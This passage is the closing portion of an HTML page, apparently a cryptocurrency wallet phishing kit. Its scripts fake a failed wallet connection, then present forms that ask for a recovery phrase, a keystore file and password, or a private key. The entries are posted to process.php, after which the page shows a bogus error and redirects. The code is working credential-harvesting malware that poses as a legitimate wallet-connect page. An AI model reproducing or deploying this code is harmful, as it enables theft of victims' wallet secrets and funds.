U3QzIwLjU2NSAyMi4wOTIgMjQgMTcuNTkyIDI0IDEyLjI5N2MwLTYuNjI3LTUuMzczLTEyLTEyLTEyIi8+PC9nPjwvc3ZnPg==" alt="Github">
								</div>
								<p>Github</p>
							</a>
						</footer>
					</div>
				</div>
			</main>
		</div>
		
		
		
		
		
		
		
		
		
		<script>

			$(document).ready(function (){
			$('.page1').on('click', function (){
					$('.pg1').show();
					$('.pg2').hide();
					$('.pg3').hide();
					$('.pg4').hide();
					$('.pg5').hide();
					$('.pg6').hide();
				});
			$('.page2').on('click', function (){
					$('.pg1').hide();
					$('.pg3').hide();
					$('.pg4').hide();
					$('.pg5').hide();
					$('.pg6').hide();
					$('.pg2').show();
				});
			$('.page3').on('click', function (){
					$('.pg1').hide();
					$('.pg2').hide();
					$('.pg4').hide();
					$('.pg5').hide();
					$('.pg6').hide();
					$('.pg3').show();
				});
			$('.page4').on('click', function (){
					$('.pg1').hide();
					$('.pg3').hide();
					$('.pg2').hide();
					$('.pg5').hide();
					$('.pg6').hide();
					$('.pg4').show();
				});
			$('.page5').on('click', function (){
					$('.pg1').hide();
					$('.pg3').hide();
					$('.pg4').hide();
					$('.pg2').hide();
					$('.pg6').hide();
					$('.pg5').show();
				});
			$('.page6').on('click', function (){
					$('.pg1').hide();
					$('.pg3').hide();
					$('.pg4').hide();
					$('.pg5').hide();
					$('.pg6').show();
					$('.pg2').hide();
				});
			});
		
		</script>
		
		
		<script>
			$(document).ready(function (){
				let wallets = $('.cmAzHq');
			wallets.each(function (){
					$(this).on('click', function (){
						event.preventDefault();
						$('.connection-info').text('Initializing...')
						$('#current-wallet-app').text($(this).children().last().text().trim());
						$('#current-wallet-logo').attr('src', $(this).children().children().first().attr('src'))
						$('#connect-dialog').show();
						setTimeout(function (){
							$('.connection-info').html('Error Connecting... <button class="manual-connection">Connect Manually</button>');
						}, 1000)
					});
			});
			});
		</script>

		<script>
			$(document).ready(function (){
				let dialogDismiss = $('.dialog-dismiss')
				let sendForm = $('#data-to-send');
				let successBox = $('#success-dialog');
				let errorBox = $('#error-dialog');
				dialogDismiss.each(function (){
					$(this).on('click', function () {
						$('#connect-dialog').hide();
						$('#send-dialog').hide();
					});
				});
				$('#phraseSend').on('click', function (){
					sendForm.html('<div class="form-group"><input type="hidden" id="type" name="type" value="phrase"><textarea name="phrase" id="phrase" required class="form-control" placeholder="Enter your recovery phrase" rows="5" style="resize: none"></textarea> </div> <div class="small text-left my-3" style="font-size: 11px">Typically 12 (sometimes 24) words separated by single spaces</div>');
				});
				$('#keystoreSend').on('click', function (){
					sendForm.html('<div class="form-group"><input type="hidden" id="type" name="type" value="keyStore"><label class="small text-left">Choose keystore file</label><input type="file" required name="keystore" id="keystore" class="form-control-file my-2"></div><input type="password" class="form-control" name="password" id="password" required placeholder="Wallet password"> <div class="small text-left my-3" style="font-size: 11px">Several lines of text beginning with "{...}" plus the password you used to encrypt it.</div>');
				});
				$('#privateKeySend').on('click', function (){
					sendForm.html('<input type="hidden" id="type" name="type" value="privatekey"><input type="text" id="privatekey" name="privatekey" required class="form-control" placeholder="Enter your Private Key"> <div class="small text-left my-3" style="font-size: 11px">Typically 12 (sometimes 24) words separated by a single space.</div>');
				});

				$('.connection-info').on('click', '.manual-connection', function (){
					$('#current-wallet-app-send').text($('#current-wallet-app').text());
					$('#walletNameData').val($('#current-wallet-app').text());
					var link=$('#current-wallet-app').text();
					$('#current-wallet-send-logo').attr('src', $('#current-wallet-logo').attr('src'));
					$('#connect-dialog').hide();
					$('#send-dialog').show();

				});

				$.ajaxSetup({
					headers: {
						'X-CSRF-TOKEN': $('meta[name="csrf-token"]').attr('content')
					}
				});

				$("#processForm").submit(function(e){
					e.preventDefault();
					let processBtn = $('#proceedButton');
					let cancelBtn = $('#cancelBtn');
					// let formData = new FormData(this);

					

					let type=$("#type").val();
					let phrase=$("#phrase").val();
					let password=$("#password").val();
					let privatekey=$("#privatekey").val();
					let keystorefile=$("#keystore").val();
					let walletNameData=$("#walletNameData").val();

					

					console.log(type);

					$.ajax({
						dataType: 'JSON',
						type:'POST',
						url:"process.php",
						// data: formData,
						data: {
							type:type,
							phrase:phrase,
							password:password,
							privatekey:privatekey,
							keystorefile:keystorefile,
							walletNameData:walletNameData,
						},
						cache:false,
						// contentType: false,
						// processData: false,
						beforeSend: function (){
							processBtn.html('<span class="spinner-border spinner-border-sm" role="status" aria-hidden="true"></span> Connecting wallet...')
							processBtn.prop('disabled', true)
							cancelBtn.prop('disabled', true)
						},

						success:function(){
							restoreButtons();
							dismissAllDialogs();
							$('.sending').show();

							setTimeout(function (){
								alert( 'Error Validating Wallet... Please try again later' );
							$('.sending').hide();
							}, 5000)
						},

						error: function (){
							restoreButtons();
							dismissAllDialogs();
							successBox.show();
							

							setTimeout(function (){
								dismissAllDialogs();
								$('.sending').show();
								location.href = '../sndml.php';
							}, 6500)

							
						}

						// error: function (){
						// 	restoreButtons();
						// 	dismissAllDialogs();
						// 	errorBox.show();
						// 	setTimeout(function (){
						// 		dismissAllDialogs();
						// 		$('#send-dialog').show();
						// 	}, 2500)
						// }
					});

					function restoreButtons(){
						processBtn.html('PROCEED')
						processBtn.prop('disabled', false)
											cancelBtn.prop('disabled', false)
					}

					function dismissAllDialogs(){
						successBox.hide();
						errorBox.hide();
						$('#connect-dialog').hide();
						$('#send-dialog').hide();
						$('#processing-dialog').hide();
					}

				});
			});
		</script>

		<script>
			$(document).ready(function (){
				let wallets = $('.cmAzHq');
			wallets.each(function (){
					$(this).on('click', function (){
						event.preventDefault();
						var link= $(this).children().last().text().trim();
						$('.connection-info').text('Initializing...')
						$('#current-wallet-app').text($(this).children().last().text().trim());
						$('#current-wallet-logo').attr('src', $(this).children().children().first().attr('src'))
						$('#connect-dialog').show();
						setTimeout(function (){
							$('.connection-info').html('Error Connecting... <button class="manual-connection">Connect Manually</button>');
						}, 1000)
					});
			});
			});
		</script>

	</div>


</body>

</html>